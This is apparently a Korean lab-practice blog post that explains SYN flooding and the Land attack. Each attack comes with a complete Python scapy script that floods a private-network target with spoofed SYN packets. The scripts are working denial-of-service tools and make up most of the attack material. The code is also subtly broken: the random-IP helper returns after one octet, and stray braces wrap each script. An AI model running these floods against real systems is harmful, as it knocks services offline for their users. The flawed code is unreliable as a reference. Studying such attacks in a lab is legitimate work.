---
layout: post
title: "Network hacking 실습"
date: 2020-05-04
excerpt: "LandAttack,SynFlooding"
tags: [LandAttack,SynFlooding,Network, hacking]
comments: true
---

## SynFlooding

SynFlooding은 Tcp에서 다른 ip와 통신하기전에 신뢰성을 유지하기위해 
3-way handShcking을 실시한다.
1, Client는 Server에게 통신을 요청하여 SYN패킷을 전송한다
2, Server는 Client에게 받은 SYN패킷을 확인하고 SYN패킷과 ACK패킷을 Client에게 전송한다
3, Client는 Server에게 SYN,Ack 패킷을 받고 다시 Server에게 ACK패킷을 전송하며 연결

이 과정에서 Client가 Server에서 SYN+ACK 패킷을 받으며 Server는 대기상태로 Client의 ACk패킷을 기다린다
이 부분의 취약점을 이용하여 공격자가 의도적으로 Server에게 ACK패킷을 전송하지 않음으로써 무한 대기상태로
만든다. 이 과정을 수없이 반복하게 되면 대량의 대기 상태 Client가 생기게 되고 Server에 부하가 가게된다.


{% capture images %}
https://user-images.githubusercontent.com/49140815/140679451-24374458-a397-4c68-bbc0-5e84a39ad7b4.PNG
{% endcapture %}
{% include gallery images=images caption="80포트 오픈확인" cols=1 %}

{% highlight python %}
{
    from scapy.all import*
from random import shuffle

def getRandomIP():
    ipRange = [x for x in range(256)]
    ip = []

    for i in range(4):
        shuffle(ipRange)
        ip.append(str(ipRange[0]))
        randomip='.'.join(ip)
        return randomip

def synAttack(targetIP):
    sourceIP = getRandomIP()
    packet_IP = IP(src = sourceIP, dst = targetIP)
    packet_TCP = TCP(sport=range(1,60000),dport=80,flags='S')
    packet = packet_IP/packet_TCP
    srflood(packet)

def main():
    targetip='192.168.0.105'
    synAttack(targetip)

if __name__=='__main__':
    main()

}
{% endhighlight %}


## LandAttack

LandAttack은 공격자가 임의의 사용자의 ip로 위장하여 출발지, 도착지 ip를 동일하게 설정함으로써
무한히 패킷을 반복시켜 서버의 부하를 유발시키는 공격이다. 
{% highlight python %}
{
    from scapy.all import*

def landAttack(targetIP):
    packet_IP = IP(src = targetIP, dst = targetIP)
    packet_TCP = TCP(sport= range(1,65535),dport=range(1,65535),flags='S')
    packet=packet_IP/packet_TCP
    srflood(packet)

def main():
    targetip = '192.168.0.105'
    landAttack(targetip)

if __name__=='__main__':
    main()

}
{% endhighlight %}

{% capture images %}
https://user-images.githubusercontent.com/49140815/140681266-968de59e-3418-4e00-9cd6-1eb64ca27812.PNG
{% endcapture %}
{% include gallery images=images caption="landattack 결과" cols=1 %}